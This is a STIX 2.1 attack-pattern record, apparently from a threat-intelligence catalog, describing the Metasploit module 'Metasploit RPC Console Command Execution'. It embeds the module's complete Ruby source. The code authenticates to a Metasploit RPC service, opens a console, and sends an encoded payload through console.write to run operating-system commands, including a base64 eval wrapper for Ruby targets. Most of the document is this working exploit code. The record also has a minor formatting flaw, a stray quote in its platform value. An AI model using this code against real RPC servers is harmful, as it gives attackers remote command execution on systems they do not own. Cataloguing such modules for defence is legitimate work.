{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa8bacf8-6fc1-4791-bd3c-bba088ed2e85",
    "created": "2024-08-14T17:06:42.034756Z",
    "modified": "2024-08-14T17:06:42.03476Z",
    "name": "Metasploit RPC Console Command Execution",
    "description": " This module connects to a specified Metasploit RPC server and uses the 'console.write' procedure to execute operating system commands. Valid credentials are required to access the RPC interface.  This module has been tested successfully on Metasploit 4.15 on Kali 1.0.6; Metasploit 4.14 on Kali 2017.1; and Metasploit 4.14 on Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/msf_rpc_console.rb",
            "external_id": "msf_rpc_console.rb"
        },
        {
            "source_name": "reference",
            "url": "https://help.rapid7.com/metasploit/Content/api/rpc/overview.html"
        },
        {
            "source_name": "reference",
            "url": "https://community.rapid7.com/docs/DOC-1516"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Metasploit RPC Console Command Execution',\n      'Description'     => %q{\n        This module connects to a specified Metasploit RPC server and\n        uses the 'console.write' procedure to execute operating\n        system commands. Valid credentials are required to access the\n        RPC interface.\n\n        This module has been tested successfully on Metasploit 4.15\n        on Kali 1.0.6; Metasploit 4.14 on Kali 2017.1; and Metasploit\n        4.14 on Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'bcoles',\n      'References'     =>\n        [\n          [ 'URL', 'https://help.rapid7.com/metasploit/Content/api/rpc/overview.html' ],\n          [ 'URL', 'https://community.rapid7.com/docs/DOC-1516' ]\n        ],\n      'Platform'       => %w{ ruby unix win },\n      'Targets'        => [\n          [ 'Ruby',        { 'Arch'     => ARCH_RUBY,\n                             'Platform' => 'ruby',\n                             'Payload'  => { 'BadChars' => \"\\x00\" } } ],\n          [ 'Windows CMD', { 'Arch'     => ARCH_CMD,\n                             'Platform' => 'win',\n                             'Payload'  => { 'BadChars' => \"\\x00\\x0A\\x0D\" } } ],\n          [ 'Unix CMD',    { 'Arch'     => ARCH_CMD,\n                             'Platform' => 'unix',\n                             'Payload'  => { 'BadChars' => \"\\x00\\x0A\\x0D\" } } ]\n        ],\n      'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 15 },\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-05-22',\n      'DefaultTarget'  => 0))\n    register_options [ Opt::RPORT(55552),\n                       OptString.new('USERNAME', [true, 'Username for Metasploit RPC', 'msf']),\n                       OptString.new('PASSWORD', [true, 'Password for the specified username', '']),\n                       OptBool.new('SSL', [ true, 'Use SSL', true]) ]\n  end\n\n  def execute_command(cmd, opts = {})\n    res = @rpc.call 'console.write', @console_id, \"\\r\\n#{cmd}\\r\\n\"\n\n    if res.nil?\n      fail_with Failure::Unknown, 'Connection failed'\n    end\n\n    unless res['wrote'].to_s =~ /\\A\\d+\\z/\n      print_error \"Could not write to console #{@console_id}:\"\n      print_line res.to_s\n      return\n    end\n\n    vprint_good \"Wrote #{res['wrote']} bytes to console\"\n  end\n\n  def exploit\n    begin\n      @rpc = Msf::RPC::Client.new :host => rhost, :port => rport, :ssl => ssl\n    rescue Rex::ConnectionRefused => e\n      fail_with Failure::Unreachable, 'Connection refused'\n    rescue => e\n      fail_with Failure::Unknown, \"Connection failed: #{e}\"\n    end\n\n    res = @rpc.login datastore['USERNAME'], datastore['PASSWORD']\n\n    if @rpc.token.nil?\n      fail_with Failure::NoAccess, 'Authentication failed'\n    end\n\n    print_good 'Authenticated successfully'\n    vprint_status \"Received temporary token: #{@rpc.token}\"\n\n    version = @rpc.call 'core.version'\n\n    if res.nil?\n      fail_with Failure::Unknown, 'Connection failed'\n    end\n\n    print_status \"Metasploit #{version['version']}\"\n    print_status \"Ruby #{version['ruby']}\"\n    print_status \"API version #{version['api']}\"\n\n    vprint_status 'Creating new console...'\n    res = @rpc.call 'console.create'\n\n    if res.nil?\n      fail_with Failure::Unknown, 'Connection failed'\n    end\n\n    unless res['id'].to_s =~ /\\A\\d+\\z/\n      print_error 'Could not create console:'\n      print_line res.to_s\n      return\n    end\n\n    @console_id = res['id']\n    print_good \"Created console ##{@console_id}\"\n\n    print_status 'Sending payload...'\n\n    case target['Platform']\n    when 'ruby'\n      cmd = \"ruby -e 'eval(%[#{Rex::Text.encode_base64(payload.encoded)}].unpack(%[m0]).first)'\"\n    when 'win'\n      cmd = payload.encoded\n    when 'unix'\n      cmd = payload.encoded\n    else\n      fail_with Failure::NoTarget, 'Invalid target'\n    end\n\n    execute_command cmd\n  end\n\n  def cleanup\n    return if @console_id.nil?\n\n    vprint_status 'Removing console...'\n    res = @rpc.call 'console.destroy', @console_id\n\n    if res.nil?\n      print_error 'Connection failed'\n      return\n    end\n\n    unless res['result'].eql? 'success'\n      print_warning \"Could not destroy console ##{@console_id}:\"\n      print_line res.to_s\n      return\n    end\n\n    vprint_good \"Destroyed console ##{@console_id}\"\n  ensure\n    @rpc.close\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-05-22",
    "x_mitre_platforms": [
        "unix'"
    ]
}